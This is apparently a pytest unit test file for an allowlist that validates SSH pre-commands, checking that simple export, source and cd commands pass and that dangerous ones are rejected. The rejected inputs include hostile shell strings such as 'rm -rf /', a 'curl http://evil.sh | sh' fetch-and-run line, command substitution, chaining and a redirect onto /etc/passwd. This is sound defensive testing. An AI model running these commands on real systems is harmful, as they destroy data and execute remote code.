"""Unit tests for the ssh_pre_commands allowlist (F-SEC-5)."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from app.connectors import ssh_pre_commands as mod
from app.connectors.ssh_pre_commands import (
    PreCommandValidationError,
    validate_pre_commands,
)


class TestAllowedForms:
    def test_export_with_path_reference(self):
        cmds = ["export PATH=/opt/mysql/bin:$PATH"]
        assert validate_pre_commands(cmds) == cmds

    def test_bare_assignment(self):
        assert validate_pre_commands(["LANG=en_US.UTF-8"]) == ["LANG=en_US.UTF-8"]

    def test_source_and_dot(self):
        assert validate_pre_commands(["source /etc/profile"]) == ["source /etc/profile"]
        assert validate_pre_commands([". /home/user/.bashrc"]) == [". /home/user/.bashrc"]

    def test_cd(self):
        assert validate_pre_commands(["cd /var/lib/app"]) == ["cd /var/lib/app"]

    def test_quoted_value_with_spaces(self):
        cmds = ["export PGOPTIONS='-c statement_timeout=30s'"]
        assert validate_pre_commands(cmds) == cmds

    def test_empty_and_none(self):
        assert validate_pre_commands(None) == []
        assert validate_pre_commands([]) == []


class TestRejectedForms:
    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",  # arbitrary binary
            "curl http://evil.sh | sh",  # pipe
            "export A=1; rm -rf /",  # chaining
            "export A=`whoami`",  # backtick substitution
            "export A=$(whoami)",  # $() substitution
            "cd /tmp && rm x",  # && chaining
            "export A=1 > /etc/passwd",  # redirect
            "source /etc/profile\nrm x",  # newline
        ],
    )
    def test_dangerous_commands_rejected(self, cmd):
        with pytest.raises(PreCommandValidationError):
            validate_pre_commands([cmd])

    def test_too_many_commands(self):
        cmds = [f"export V{i}=1" for i in range(mod.MAX_PRE_COMMANDS + 1)]
        with pytest.raises(PreCommandValidationError, match="Too many"):
            validate_pre_commands(cmds)

    def test_too_long_command(self):
        cmd = "export A=" + "x" * mod.MAX_PRE_COMMAND_LENGTH
        with pytest.raises(PreCommandValidationError, match="exceeds"):
            validate_pre_commands([cmd])

    def test_blank_command(self):
        with pytest.raises(PreCommandValidationError, match="non-empty"):
            validate_pre_commands(["   "])


class TestEscapeHatch:
    def test_disabled_allowlist_passes_anything(self):
        with patch.object(mod.settings, "ssh_pre_command_allowlist_enabled", False):
            assert validate_pre_commands(["rm -rf /"]) == ["rm -rf /"]

    def test_allowlist_enabled_by_default(self):
        from app.config import Settings

        assert Settings.model_fields["ssh_pre_command_allowlist_enabled"].default is True
